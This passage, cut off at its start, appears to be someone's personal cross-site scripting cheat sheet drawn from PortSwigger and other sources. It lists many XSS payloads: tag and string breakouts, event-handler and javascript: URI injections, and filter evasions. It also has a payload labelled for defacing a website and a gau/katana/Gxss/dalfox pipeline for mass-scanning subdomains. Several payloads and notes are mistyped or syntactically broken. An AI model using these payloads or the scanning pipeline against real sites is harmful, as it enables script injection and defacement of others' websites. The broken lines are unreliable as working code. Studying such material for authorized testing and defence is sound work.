[] --------> re not part of the exploit also try to avaid using alert() use prompt(0) or print()

# personal notes on XSS from portswigger and others
1. Look for input: forms, search bot,signups, update profile and apis and insert this payload

# <img onload=alert("Xss") src="example.png)>
Inspect how it is being reflected

# Breaking out of image tag
["><svg onload=alert(0)>]

# if the exploit is being quoted and reflected use
["onmouseover="alert(1)]

# if you click certain element aalert pops up
[javascript:alert(0)]

# Breaking out of javascript string
[' -alert(0)-']

# When the website uses replace() fuction  to encode angle brackets use:
[<>img src=0 onerror=alert(0)>]

# if alert fail try using print()

# TESTING REFLECTED XSS
1.Test every entry point both on the web and proxy
2.Submit alphanumeric characters and and check where they are being reflected in dev tools
3.Determine the context >>>> where and how it is being reflected
4.Test candidate payloads based on the reflection context and check the proxy
5.Test alternative payloads
6.Copy the url from proxy to the browser

# pop up a visible popup window on the browser

[alert(document.domain)] ////>>>>>> alternative to alert(0) ----> deending on the filters
# try url encoding the script

#Reflects when access keys are pressed
['acceskey='x' onclick='alert(0)] press [art+shit+x]

# brutelogic XSS
1.Event Based
[TAG EVENT=alert(0)] -------> TAG being html or xml tags examples:
<body onload=alert(0)>
<img src=0 onerror=alert(0)>
<svg onload=alert(0)>
<x onmouseover=alert(0)> -------> x being elements on the site

2.RESOURCE BASED
[TAG RESOURCE=javascript:alert(0)] examples:
<iframe src=javascript:alert(0)> -------> running js within an iframe
<object data=javascript:alert(1)>

[<script>alert(document.domain></script>]

# DEFACE A WEBSITE
<svg onload="document.body.innerHTML/='<img src=//HOST/IMAGE'">

# Other payloads
["><svg onload=alert(1)>]

["><img src=x onerror=prompt(0);>] --------> closes the previous tag
[<script>alert(0)<!-]
[<a onmouseover"alert(1)">test </a>] --------> insert a link that will cause js to execute

			[ AWESOME PAYLOADS ]
[/usr/share/seclists/Fuzzing/XSS]
[/usr/share/seclists/Fuzzing/xss-fuzzing]

			[ XSS AUTOMATION	]
1. gather subdomains and resolve them httxp or dnsx
2. Endpoints from wayback :
# cat subdomains.txt | gau --threads 5 >> Endpoints.txt
# katana subdomains.txt | katana -jc >> Endpoints.txt
3.Remove duplicates
# cat Endpoints.txt | uro >> Clean_Endpoints.txt
4.Filter the endpoints
# cat Clean_Endpoints.txt | gf xss >> xss.txt
5.Gxss to find parameters reflected in the response
# cat xss.txt | Gxss =p khxss -o RelectedXss.txt
6. Check manually or use dalfox --------> for good wins try manually
# dalfox file ReflectedXss.txt -o VulnerableXss.txt

